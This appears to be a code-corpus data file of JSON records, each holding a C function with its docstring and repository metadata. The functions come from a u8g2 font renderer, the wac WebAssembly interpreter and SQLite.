{"docstring": "/* set ascent/descent for reference point calculation */\n", "func_signal": "void u8g2_UpdateRefHeight(u8g2_t *u8g2)", "code": "{\n  if ( u8g2->font == NULL )\n    return;\n  u8g2->font_ref_ascent = u8g2->font_info.ascent_A;\n  u8g2->font_ref_descent = u8g2->font_info.descent_g;\n  if ( u8g2->font_height_mode == U8G2_FONT_HEIGHT_MODE_TEXT )\n  {\n  }\n  else if ( u8g2->font_height_mode == U8G2_FONT_HEIGHT_MODE_XTEXT )\n  {\n    if ( u8g2->font_ref_ascent < u8g2->font_info.ascent_para )\n      u8g2->font_ref_ascent = u8g2->font_info.ascent_para;\n    if ( u8g2->font_ref_descent > u8g2->font_info.descent_para )\n      u8g2->font_ref_descent = u8g2->font_info.descent_para;\n  }\n  else\n  {\n    if ( u8g2->font_ref_ascent < u8g2->font_info.max_char_height+u8g2->font_info.y_offset )\n      u8g2->font_ref_ascent = u8g2->font_info.max_char_height+u8g2->font_info.y_offset;\n    if ( u8g2->font_ref_descent > u8g2->font_info.y_offset )\n      u8g2->font_ref_descent = u8g2->font_info.y_offset;\n  }  \n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*\nsource: https://en.wikipedia.org/wiki/UTF-8\nBits\tfrom \t\tto\t\t\tbytes\tByte 1 \t\tByte 2 \t\tByte 3 \t\tByte 4 \t\tByte 5 \t\tByte 6\n  7 \tU+0000 \t\tU+007F \t\t1 \t\t0xxxxxxx\n11 \tU+0080 \t\tU+07FF \t\t2 \t\t110xxxxx \t10xxxxxx\n16 \tU+0800 \t\tU+FFFF \t\t3 \t\t1110xxxx \t10xxxxxx \t10xxxxxx\n21 \tU+10000 \tU+1FFFFF \t4 \t\t11110xxx \t10xxxxxx \t10xxxxxx \t10xxxxxx\n26 \tU+200000 \tU+3FFFFFF \t5 \t\t111110xx \t10xxxxxx \t10xxxxxx \t10xxxxxx \t10xxxxxx\n31 \tU+4000000 \tU+7FFFFFFF \t6 \t\t1111110x \t10xxxxxx \t10xxxxxx \t10xxxxxx \t10xxxxxx \t10xxxxxx  \n*/\n", "func_signal": "u8g2_uint_t u8g2_DrawUTF8(u8g2_t *u8g2, u8g2_uint_t x, u8g2_uint_t y, const char *str)", "code": "{\n  u8g2->u8x8.next_cb = u8x8_utf8_next;\n  return u8g2_draw_string(u8g2, x, y, str);\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*\n  Description:\n    Draw a run-length area of the glyph. \"len\" can have any size and the line\n    length has to be wrapped at the glyph border.\n  Args:\n    len: \t\t\t\t\tLength of the line\n    is_foreground\t\t\tforeground/background?\n    u8g2->font_decode.target_x\t\tX position\n    u8g2->font_decode.target_y\t\tY position\n    u8g2->font_decode.is_transparent\tTransparent mode\n  Return:\n    -\n  Calls:\n    u8g2_Draw90Line()\n  Called by:\n    u8g2_font_decode_glyph()\n*/\n/* optimized */\n", "func_signal": "void u8g2_font_decode_len(u8g2_t *u8g2, uint8_t len, uint8_t is_foreground)", "code": "{\n  uint8_t cnt;\t/* total number of remaining pixels, which have to be drawn */\n  uint8_t rem; \t/* remaining pixel to the right edge of the glyph */\n  uint8_t current;\t/* number of pixels, which need to be drawn for the draw procedure */\n    /* current is either equal to cnt or equal to rem */\n  \n  /* local coordinates of the glyph */\n  uint8_t lx,ly;\n  \n  /* target position on the screen */\n  u8g2_uint_t x, y;\n  \n  u8g2_font_decode_t *decode = &(u8g2->font_decode);\n  \n  cnt = len;\n  \n  /* get the local position */\n  lx = decode->x;\n  ly = decode->y;\n  \n  for(;;)\n  {\n    /* calculate the number of pixel to the right edge of the glyph */\n    rem = decode->glyph_width;\n    rem -= lx;\n    \n    /* calculate how many pixel to draw. This is either to the right edge */\n    /* or lesser, if not enough pixel are left */\n    current = rem;\n    if ( cnt < rem )\n      current = cnt;\n    \n    \n    /* now draw the line, but apply the rotation around the glyph target position */\n    //u8g2_font_decode_draw_pixel(u8g2, lx,ly,current, is_foreground);\n\n    /* get target position */\n    x = decode->target_x;\n    y = decode->target_y;\n\n    /* apply rotation */\n#ifdef U8G2_WITH_FONT_ROTATION\n    x = u8g2_add_vector_x(x, lx, ly, decode->dir);\n    y = u8g2_add_vector_y(y, lx, ly, decode->dir);\n#else\n    x += lx;\n    y += ly;\n#endif\n    \n    /* draw foreground and background (if required) */\n    if ( is_foreground )\n    {\n      u8g2->draw_color = decode->fg_color;\t\t\t/* draw_color will be restored later */\n      u8g2_DrawHVLine(u8g2, \n\tx, \n\ty, \n\tcurrent, \n#ifdef U8G2_WITH_FONT_ROTATION\n\t/* dir */ decode->dir\n#else\n\t0\n#endif\n      );\n    }\n    else if ( decode->is_transparent == 0 )    \n    {\n      u8g2->draw_color = decode->bg_color;\t\t\t/* draw_color will be restored later */\n      u8g2_DrawHVLine(u8g2, \n\tx, \n\ty, \n\tcurrent, \n#ifdef U8G2_WITH_FONT_ROTATION\n\t/* dir */ decode->dir\n#else\n\t0\n#endif\n      );   \n    }\n    \n    /* check, whether the end of the run length code has been reached */\n    if ( cnt < rem )\n      break;\n    cnt -= rem;\n    lx = 0;\n    ly++;\n  }\n  lx += cnt;\n  \n  decode->x = lx;\n  decode->y = ly;\n  \n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*\n  Description:\n    Find the starting point of the glyph data.\n  Args:\n    encoding: Encoding (ASCII or Unicode) of the glyph\n  Return:\n    Address of the glyph data or NULL, if the encoding is not avialable in the font.\n*/\n", "func_signal": "const uint8_t *u8g2_font_get_glyph_data(u8g2_t *u8g2, uint16_t encoding)", "code": "{\n  const uint8_t *font = u8g2->font;\n  font += U8G2_FONT_DATA_STRUCT_SIZE;\n\n  \n  if ( encoding <= 255 )\n  {\n    if ( encoding >= 'a' )\n    {\n      font += u8g2->font_info.start_pos_lower_a;\n    }\n    else if ( encoding >= 'A' )\n    {\n      font += u8g2->font_info.start_pos_upper_A;\n    }\n    \n    for(;;)\n    {\n      if ( u8x8_pgm_read( font + 1 ) == 0 )\n\tbreak;\n      if ( u8x8_pgm_read( font ) == encoding )\n      {\n\treturn font+2;\t/* skip encoding and glyph size */\n      }\n      font += u8x8_pgm_read( font + 1 );\n    }\n  }\n#ifdef U8G2_WITH_UNICODE\n  else\n  {\n    uint16_t e;\n    \n#ifdef  __unix__\n    if ( u8g2->last_font_data != NULL && encoding >= u8g2->last_unicode )\n    {\n\tfont = u8g2->last_font_data;\n    }\n    else\n#endif \n\n    font += u8g2->font_info.start_pos_unicode;\n    \n    \n    for(;;)\n    {\n      e = u8x8_pgm_read( font );\n      e <<= 8;\n      e |= u8x8_pgm_read( font + 1 );\n  \n#ifdef  __unix__\n      if ( encoding < e )\n        break;\n#endif \n\n      if ( e == 0 )\n\tbreak;\n  \n      if ( e == encoding )\n      {\n#ifdef  __unix__\n\tu8g2->last_font_data = font;\n\tu8g2->last_unicode = encoding;\n#endif \n\treturn font+3;\t/* skip encoding and glyph size */\n      }\n      font += u8x8_pgm_read( font + 2 );\n    }  \n  }\n#endif\n  \n  return NULL;\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "/*\nsource: https://en.wikipedia.org/wiki/UTF-8\nBits\tfrom \t\tto\t\t\tbytes\tByte 1 \t\tByte 2 \t\tByte 3 \t\tByte 4 \t\tByte 5 \t\tByte 6\n  7 \tU+0000 \t\tU+007F \t\t1 \t\t0xxxxxxx\n11 \tU+0080 \t\tU+07FF \t\t2 \t\t110xxxxx \t10xxxxxx\n16 \tU+0800 \t\tU+FFFF \t\t3 \t\t1110xxxx \t10xxxxxx \t10xxxxxx\n21 \tU+10000 \tU+1FFFFF \t4 \t\t11110xxx \t10xxxxxx \t10xxxxxx \t10xxxxxx\n26 \tU+200000 \tU+3FFFFFF \t5 \t\t111110xx \t10xxxxxx \t10xxxxxx \t10xxxxxx \t10xxxxxx\n31 \tU+4000000 \tU+7FFFFFFF \t6 \t\t1111110x \t10xxxxxx \t10xxxxxx \t10xxxxxx \t10xxxxxx \t10xxxxxx  \n*/\n", "func_signal": "u8g2_uint_t u8g2_GetUTF8Width(u8g2_t *u8g2, const char *str)", "code": "{\n  u8g2->u8x8.next_cb = u8x8_utf8_next;\n  return u8g2_string_width(u8g2, str);\n}", "path": "18_u8g2\\components\\u8g2\\csrc\\u8g2_font.c", "repo_name": "lucadentella/esp32-tutorial", "stars": 504, "license": "None", "language": "c", "size": 21980}
{"docstring": "// TODO: calculate this while parsing types\n", "func_signal": "uint64_t get_type_mask(Type *type)", "code": "{\n    uint64_t  mask = 0x80;\n\n    if (type->result_count == 1) {\n        mask |= 0x80 - type->results[0];\n    }\n    mask = mask << 4;\n    for(uint32_t p=0; p<type->param_count; p++) {\n        mask = ((uint64_t)mask) << 4;\n        mask |= 0x80 - type->params[p];\n    }\n    return mask;\n}", "path": "wa.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Assert realloc/calloc\n", "func_signal": "void *arecalloc(void *ptr, size_t old_nmemb, size_t nmemb,\n                size_t size,  char *name)", "code": "{\n    void *res = realloc(ptr, nmemb * size);\n    if (res == NULL) {\n        FATAL(\"Could not allocate %ul bytes for %s\", nmemb * size, name);\n    }\n    // Initialize new memory\n    memset(res + old_nmemb * size, 0, (nmemb - old_nmemb) * size);\n    return res;\n}", "path": "platform_libc.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Assert realloc/calloc\n", "func_signal": "void *arecalloc(void *ptr, size_t old_nmemb, size_t nmemb,\n                size_t size,  char *name)", "code": "{\n    void *res = calloc(nmemb, size);\n    if (res == NULL) {\n        FATAL(\"Could not allocate %d bytes for %s\", (int)(nmemb * size), name);\n    }\n    memmove(res, ptr, old_nmemb * size);\n    // Initialize new memory\n    memset(res + old_nmemb * size, 0, (nmemb - old_nmemb) * size);\n    //printf(\"<<< arecalloc res: %p\\n\", res);\n    return res;\n}", "path": "platform_fooboot.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// open and mmap a file\n", "func_signal": "uint8_t *mmap_file(char *path, int *len)", "code": "{\n    int          fd;\n    int          res;\n    struct stat  sb;\n    uint8_t     *bytes;\n\n    fd = open(path, O_RDONLY);\n    if (fd < 0) { FATAL(\"could not open file '%s'\\n\", path); }\n    res = fstat(fd, &sb);\n    if (res < 0) { FATAL(\"could not stat file '%s' (%d)\\n\", path, res); }\n\n    bytes = mmap(0, sb.st_size, PROT_READ, MAP_SHARED, fd, 0);\n    if (len) {\n        *len = sb.st_size;  // Return length if requested\n    }\n    if (bytes == MAP_FAILED) { FATAL(\"could not mmap file '%s'\", path); }\n    return bytes;\n}", "path": "platform_libc.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "/////////////////////////////////////////////////////////\n// Command line\n", "func_signal": "int main(int argc, char **argv, char **envp)", "code": "{\n    char     *mod_path;\n    int       res = 0;\n    uint8_t  *bytes = NULL;\n    int       byte_count;\n\n    // Parse arguments\n    if (argc < 2) { usage(argv[0]); }\n    mod_path = argv[1];\n\n    // Load the module\n#if PLATFORM==1\n    // open and mmap the WASM module\n    bytes = mmap_file(mod_path, &byte_count);\n#else\n    // read the file via mem_fs or serial method\n    byte_count = vfs_file_size(mod_path);\n    if (byte_count > 0) {\n        bytes = malloc(byte_count);\n        vfs_read_file(mod_path, (char *)bytes);\n    }\n#endif\n    if (bytes == NULL) {\n        fprintf(stderr, \"Could not load %s\", mod_path);\n        return 2;\n    }\n\n    Options opts;\n    Module *m = load_module(bytes, byte_count, opts);\n    m->path = mod_path;\n\n    Memory *mem = get_export(m, \"memory\", KIND_MEMORY);\n    if (!mem) { FATAL(\"no exported memory named 'memory'\\n\"); }\n    init_wasi(mem, argc-1, argv+1, envp);\n\n    // Invoke main/_main function and exit\n    Block *func = get_export(m, \"_start\", KIND_FUNCTION);\n    if ((!func)) { FATAL(\"no exported function named '_start'\\n\"); }\n    res = invoke(m, func->fidx);\n\n    if (!res) {\n        error(\"Exception: %s\\n\", exception);\n        return 1;\n    }\n\n    if (m->sp >= 0) {\n        return (m->stack[m->sp--].value.uint32);\n    } else {\n        return 0;\n    }\n\n}", "path": "wax.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Push arguments\n// return function pointer to thunk_in_* function\n", "func_signal": "void (*setup_thunk_in(uint32_t fidx))()", "code": "{\n    Module   *m = _wa_current_module_; // TODO: global state, clean up somehow\n    Block    *func = &m->functions[fidx];\n    Type     *type = func->type;\n\n    // Make space on the stack\n    m->sp += type->param_count;\n\n    if (TRACE) {\n        warn(\"  {{}} setup_thunk_in '%s', mask: 0x%x, ARGS FOR '>>' ARE BOGUS\\n\",\n             func->export_name, type->mask);\n    }\n\n    // Do normal function call setup. The fp will point to the start of stack\n    // elements that were just added above\n    setup_call(m, fidx);\n\n    // Set the type of the unset stack elements\n    for(uint32_t p=0; p<type->param_count; p++) {\n        m->stack[m->fp+p].value_type = type->params[p];\n    }\n\n    // Return the thunk_in function\n    void (*f)(void) = NULL;\n    switch (type->mask) {\n    case 0x800      : f = (void (*)(void)) thunk_in_0_0; break;\n    case 0x8101     : f = (void (*)(void)) thunk_in_i_i; break;\n    case 0x80011    : f = (void (*)(void)) thunk_in_0_ii; break;\n    default: FATAL(\"unsupported thunk_in mask 0x%llx\\n\", type->mask);\n    }\n\n    return f;\n}", "path": "thunk.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Parse and add arguments to the stack\n", "func_signal": "void parse_args(Module *m, Type *type, int argc, char **argv)", "code": "{\n    for (int i=0; i<argc; i++) {\n        for (int j=0; argv[i][j]; j++) {\n            argv[i][j] = tolower(argv[i][j]); // lowecase\n        }\n        m->sp++;\n        StackValue *sv = &m->stack[m->sp];\n       sv->value_type = type->params[i];\n        switch (type->params[i]) {\n        case I32: sv->value.uint32 = strtoul(argv[i], NULL, 0); break;\n        case I64: sv->value.uint64 = strtoull(argv[i], NULL, 0); break;\n        case F32: if (strncmp(\"-nan\", argv[i], 4) == 0) {\n                      sv->value.f32 = -NAN;\n                  } else {\n                      sv->value.f32 = atof(argv[i]);\n                  }; break;\n        case F64: if (strncmp(\"-nan\", argv[i], 4) == 0) {\n                      sv->value.f64 = -NAN;\n                  } else {\n                      sv->value.f64 = atof(argv[i]);\n                  }; break;\n        }\n    }\n}", "path": "wac.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Assert calloc\n", "func_signal": "void *acalloc(size_t nmemb, size_t size,  char *name)", "code": "{\n    void *res = calloc(nmemb, size);\n    if (res == NULL) {\n        FATAL(\"Could not allocate %ul bytes for %s\", nmemb * size, name);\n    }\n    return res;\n}", "path": "platform_libc.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "//\n// Stack machine (byte code related functions)\n//\n", "func_signal": "void push_block(Module *m, Block *block, int sp)", "code": "{\n    m->csp += 1;\n    m->callstack[m->csp].block = block;\n    m->callstack[m->csp].sp = sp;\n    m->callstack[m->csp].fp = m->fp;\n    m->callstack[m->csp].ra = m->pc;\n}", "path": "wa.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// if entry == NULL,  attempt to invoke 'main' or '_main'\n// Return value of false means exception occured\n", "func_signal": "bool invoke(Module *m, uint32_t fidx)", "code": "{\n    bool      result;\n\n    if (TRACE && DEBUG) { dump_stacks(m); }\n\n    setup_call(m, fidx);\n\n    result = interpret(m);\n\n    if (TRACE && DEBUG) { dump_stacks(m); }\n\n    return result;\n}", "path": "wa.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "//\n// Outbound Thunks (calling imported functions)\n//\n", "func_signal": "void thunk_out(Module *m, uint32_t fidx)", "code": "{\n    Block    *func = &m->functions[fidx];\n    Type     *type = func->type;\n    if (TRACE) {\n        warn(\"  >>> thunk_out 0x%x(%d) %s.%s(\",\n             func->fidx, func->fidx,\n             func->import_module, func->import_field);\n        for (int p=type->param_count-1; p >= 0; p--) {\n            warn(\"%s%s\", value_repr(&m->stack[m->sp-p]), p ? \" \" : \"\");\n        }\n        warn(\"), %d results\\n\", type->result_count);\n        debug(\"      mask: 0x%x\\n\", type->mask);\n    }\n\n    switch (type->mask) {\n    case 0x800          : THUNK_OUT_0(m, func, 0);              break;\n    case 0x8001         : THUNK_OUT_1(m, func, 0, i);           break;\n    case 0x80011        : THUNK_OUT_2(m, func, 0, i,i);         break;\n    case 0x800111       : THUNK_OUT_3(m, func, 0, i,i,i);       break;\n    case 0x8001111      : THUNK_OUT_4(m, func, 0, i,i,i,i);     break;\n    case 0x810          : THUNK_OUT_0(m, func, i);              break;\n    case 0x8101         : THUNK_OUT_1(m, func, i, i);           break;\n    case 0x81011        : THUNK_OUT_2(m, func, i, i,i);         break;\n    case 0x810111       : THUNK_OUT_3(m, func, i, i,i,i);       break;\n    case 0x8101111      : THUNK_OUT_4(m, func, i, i,i,i,i);     break;\n    case 0x81011111     : THUNK_OUT_5(m, func, i, i,i,i,i,i);   break;\n    case 0x8003         : THUNK_OUT_1(m, func, 0, f);           break;\n    case 0x80033        : THUNK_OUT_2(m, func, 0, f,f);         break;\n    case 0x800333       : THUNK_OUT_3(m, func, 0, f,f,f);       break;\n    case 0x8003333      : THUNK_OUT_4(m, func, 0, f,f,f,f);     break;\n    case 0x8303         : THUNK_OUT_1(m, func, f, f);           break;\n    case 0x8004         : THUNK_OUT_1(m, func, 0, F);           break;\n    case 0x80044        : THUNK_OUT_2(m, func, 0, F,F);         break;\n    case 0x800444       : THUNK_OUT_3(m, func, 0, F,F,F);       break;\n    case 0x8004444      : THUNK_OUT_4(m, func, 0, F,F,F,F);     break;\n    case 0x800444444    : THUNK_OUT_6(m, func, 0, F,F,F,F,F,F); break;\n    case 0x8002         : THUNK_OUT_1(m, func, 0, I);           break;\n    case 0x8103         : THUNK_OUT_1(m, func, i, f);           break;\n    case 0x810121       : THUNK_OUT_3(m, func, i, i,I,i);       break;\n    case 0x8404         : THUNK_OUT_1(m, func, F, F);           break;\n    case 0x810111112211 : THUNK_OUT_9(m, func, i, i,i,i,i,i,I,I,i,i); break;\n    // TODO: casting this can truncate the top of the mask\n    default: FATAL(\"unsupported thunk_out mask 0x%x\\n\", (unsigned int)type->mask);\n    }\n\n    if (TRACE) {\n        warn(\"  <<< thunk_out 0x%x(%d) %s.%s = %s\\n\",\n             func->fidx, func->fidx, func->import_module, func->import_field,\n             type->result_count > 0 ? value_repr(&m->stack[m->sp]) : \"_\");\n    }\n}", "path": "thunk.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "//\n// Public API\n//\n", "func_signal": "void *get_export(Module *m, char *name, uint32_t kind)", "code": "{\n    // Find export index by name and return the value\n    for (uint32_t e=0; e<m->export_count; e++) {\n        char *ename = m->exports[e].export_name;\n        if (!ename) { continue; }\n        if (strncmp(name, ename, 1024) == 0) {\n            return m->exports[e].value;\n        }\n    }\n    return NULL;\n}", "path": "wa.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Setup a function\n// Push params and locals on the stack and save a call frame on the call stack\n// Sets new pc value for the start of the function\n", "func_signal": "void setup_call(Module *m, uint32_t fidx)", "code": "{\n    Block  *func = &m->functions[fidx];\n    Type   *type = func->type;\n\n    // Push current frame on the call stack\n    push_block(m, func, m->sp - type->param_count);\n\n    if (TRACE) {\n        warn(\"  >> fn0x%x(%d) %s(\",\n             fidx, fidx, func->export_name ? func->export_name : \"\");\n        for (int p=type->param_count-1; p >= 0; p--) {\n            warn(\"%s%s\", value_repr(&m->stack[m->sp-p]),\n                 p ? \" \" : \"\");\n        }\n        warn(\"), %d locals, %d results\\n\",\n             func->local_count, type->result_count);\n    }\n\n    // Push locals (dropping extras)\n    m->fp = m->sp - type->param_count + 1;\n    // TODO: validate arguments vs formal params\n\n    // Push function locals\n    for (uint32_t lidx=0; lidx<func->local_count; lidx++) {\n        m->sp += 1;\n        m->stack[m->sp].value_type = func->locals[lidx];\n        m->stack[m->sp].value.uint64 = 0; // Initialize whole union to 0\n    }\n\n    // Set program counter to start of function\n    m->pc = func->start_addr;\n    return;\n}", "path": "wa.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "//\n// Dynamic lib resolution\n//\n", "func_signal": "bool resolvesym(char *filename, char *symbol, void **val, char **err)", "code": "{\n    //printf(\"resolvesym filename: '%s', symbol: '%s'\\n\", filename, symbol);\n    if (filename && strcmp(filename, \"env\") != 0) {\n        *err = \"resolvesym with filename unimplmented\";\n        return false;\n    }\n    *val = sym_table_lookup(symbol);\n    //printf(\"           *val: %p\\n\", *val);\n    return true;\n}", "path": "platform_fooboot.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Assert calloc\n", "func_signal": "void *acalloc(size_t nmemb, size_t size,  char *name)", "code": "{\n    void *res = calloc(nmemb, size);\n    if (res == NULL) {\n        FATAL(\"Could not allocate %d bytes for %s\", (int)(nmemb * size), name);\n    }\n    //printf(\"<<< acalloc res: %p\\n\", res);\n    return res;\n}", "path": "platform_fooboot.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// https://github.com/CraneStation/wasmtime/blob/master/docs/WASI-api.md\n", "func_signal": "uint32_t _wasi_unstable__args_get_(uint32_t argv_offset,\n                                   uint32_t argv_buf_offset)", "code": "{\n    copy_string_array(host_argv, host_argc,\n                      offset2addr(argv_offset),\n                      offset2addr(argv_buf_offset),\n                      true);\n    return __WASI_ESUCCESS;\n}", "path": "wasi.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "/////////////////////////////////////////////////////////\n// Command line\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    char     *mod_path;\n    int       res = 0;\n    uint8_t  *bytes = NULL;\n    int       byte_count;\n\n    // Parse arguments\n    if (argc < 2) { usage(argv[0]); }\n    mod_path = argv[1];\n\n    init_wace();\n\n    // Load the module\n#if PLATFORM==1\n    // open and mmap the WASM module\n    bytes = mmap_file(mod_path, &byte_count);\n#else\n    // read the file via mem_fs or serial method\n    byte_count = vfs_file_size(mod_path);\n    if (byte_count > 0) {\n        bytes = malloc(byte_count);\n        vfs_read_file(mod_path, (char *)bytes);\n    }\n#endif\n    if (bytes == NULL) {\n        fprintf(stderr, \"Could not load %s\", mod_path);\n        return 2;\n    }\n\n    Options opts = { .disable_memory_bounds = true,\n                     .mangle_table_index    = MANGLE_TABLE_INDEX,\n                     .dlsym_trim_underscore = true };\n    Module *m = load_module(bytes, byte_count, opts);\n    m->path = mod_path;\n\n    init_thunk_in(m);\n\n    // emscripten initialization\n    Block *func = get_export(m, \"__post_instantiate\", KIND_FUNCTION);\n    if (func) {\n        res = invoke(m, func->fidx);\n    }\n\n    // setup argc/argv\n    m->stack[++m->sp].value_type = I32;\n    m->stack[m->sp].value.uint32 = argc-1;\n    m->stack[++m->sp].value_type = I32;\n    m->stack[m->sp].value.uint32 = (uint32_t)(argv+1);\n\n    // Invoke main/_main function and exit\n    func = get_export(m, \"main\", KIND_FUNCTION);\n    if (!func) {\n        func = get_export(m, \"_main\", KIND_FUNCTION);\n\tif (!func) {\n\t    FATAL(\"no exported function named 'main' or '_main'\\n\");\n\t}\n    }\n    res = invoke(m, func->fidx);\n\n    if (!res) {\n        error(\"Exception: %s\\n\", exception);\n        return 1;\n    }\n\n    if (m->sp >= 0) {\n        return (m->stack[m->sp--].value.uint32);\n    } else {\n        return 0;\n    }\n\n}", "path": "wace.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "/**\n * Loads the image located at 'fileName' and copies it to the\n * renderer 'renderer'\n */\n", "func_signal": "int testImage(SDL_Renderer* renderer, const char* fileName)", "code": "{\n  SDL_Surface *image = IMG_Load(fileName);\n  if (!image)\n  {\n     return 0;\n  }\n  int result = image->w;\n\n  /**\n   * position and size that you wish the image to be copied\n   * to on the renderer:\n   */\n  SDL_Rect dest = {.x = 200, .y = 100, .w = 200, .h = 200};\n\n  SDL_Texture *tex = SDL_CreateTextureFromSurface(renderer, image);\n\n  SDL_RenderCopy (renderer, tex, NULL, &dest);\n\n  /**\n   * Now that the image data is in the renderer, we can free the memory\n   * used by the texture and the image surface\n   */\n  SDL_DestroyTexture (tex);\n\n  SDL_FreeSurface (image);\n\n  return result;\n}", "path": "examples_c\\hello_owl\\hello_owl.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// If filename is NULL, a NULL handle will be used\n// Returns true if resolution successful\n// Return false and sets err if resolution is not successful\n", "func_signal": "bool resolvesym(char *filename, char *symbol, void **val, char **err)", "code": "{\n    void *handle = NULL;\n    dlerror(); // clear errors\n    //log(\"filename: %s, symbol: %s\\n\", filename, symbol);\n    if (filename) {\n        handle = dlopen(filename, RTLD_LAZY);\n        if (!handle) {\n            *err = dlerror();\n            return false;\n        }\n    }\n    *val = dlsym(handle, symbol);\n    //log(\"    val: 0x%p\\n\", *val);\n    if ((*err = dlerror()) != NULL) {\n        return false;\n    }\n    return true;\n}", "path": "platform_libc.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "// Initialize memory globals and function/jump table\n", "func_signal": "void init_wace()", "code": "{\n    _env__memoryBase_ = calloc(PAGE_COUNT, PAGE_SIZE);\n\n    _env__tempDoublePtr_ = (uint32_t*)_env__memoryBase_;\n    _env__DYNAMICTOP_PTR_ = (uint32_t**)(_env__memoryBase_ + 16);\n\n    *_env__DYNAMICTOP_PTR_ = (uint32_t*)(_env__memoryBase_ + PAGE_COUNT * PAGE_SIZE);\n\n    // This arrangement correlates to the module mangle_table_offset option\n    if (posix_memalign((void **)&_env__table_.entries, sysconf(_SC_PAGESIZE),\n                       TABLE_COUNT*sizeof(uint32_t))) {\n        perror(\"posix_memalign\");\n        exit(1);\n    }\n    _env__tableBase_ = _env__table_.entries;\n\n    info(\"init_mem results:\\n\");\n    info(\"  _env__memory_.bytes: %p\\n\", _env__memory_.bytes);\n    info(\"  _env__memoryBase_: %p\\n\", _env__memoryBase_);\n    info(\"  _env__DYNAMIC_TOP_PTR_: %p\\n\", _env__DYNAMICTOP_PTR_);\n    info(\"  *_env__DYNAMIC_TOP_PTR_: %p\\n\", *_env__DYNAMICTOP_PTR_);\n    info(\"  _env__table_.entries: %p\\n\", _env__table_.entries);\n    info(\"  _env__tableBase_: 0x%x\\n\", _env__tableBase_);\n\n    init_thunk_in_trap();\n}", "path": "wace_emscripten.c", "repo_name": "kanaka/wac", "stars": 437, "license": "other", "language": "c", "size": 202}
{"docstring": "/*\n** Free all structures in the Pager.aSavepoint[] array and set both\n** Pager.aSavepoint and Pager.nSavepoint to zero. Close the sub-journal\n** if it is open and the pager is not in exclusive mode.\n*/\n", "func_signal": "static void releaseAllSavepoints(Pager *pPager)", "code": "{\n  int ii;               /* Iterator for looping through Pager.aSavepoint */\n  for(ii=0; ii<pPager->nSavepoint; ii++){\n    sqlite3BitvecDestroy(pPager->aSavepoint[ii].pInSavepoint);\n  }\n  if( !pPager->exclusiveMode || sqlite3IsMemJournal(pPager->sjfd) ){\n    sqlite3OsClose(pPager->sjfd);\n  }\n  sqlite3_free(pPager->aSavepoint);\n  pPager->aSavepoint = 0;\n  pPager->nSavepoint = 0;\n  pPager->nSubRec = 0;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** If the expression list pEList contains more than iLimit elements,\n** leave an error message in pParse.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3ExprListCheckLength(\n  Parse *pParse,\n  ExprList *pEList,\n  const char *zObject\n)", "code": "{\n  int mx = pParse->db->aLimit[SQLITE_LIMIT_COLUMN];\n  testcase( pEList && pEList->nExpr==mx );\n  testcase( pEList && pEList->nExpr==mx+1 );\n  if( pEList && pEList->nExpr>mx ){\n    sqlite3ErrorMsg(pParse, \"too many columns in %s\", zObject);\n  }\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
{"docstring": "/*\n** Close a tokenization cursor previously opened by a call to\n** simpleOpen() above.\n*/\n", "func_signal": "static int simpleClose(sqlite3_tokenizer_cursor *pCursor)", "code": "{\n  simple_tokenizer_cursor *c = (simple_tokenizer_cursor *) pCursor;\n  sqlite3_free(c->pToken);\n  sqlite3_free(c);\n  return SQLITE_OK;\n}", "path": "apps\\api_server\\sqlite3.c", "repo_name": "cesanta/fossa", "stars": 428, "license": "other", "language": "c", "size": 8015}
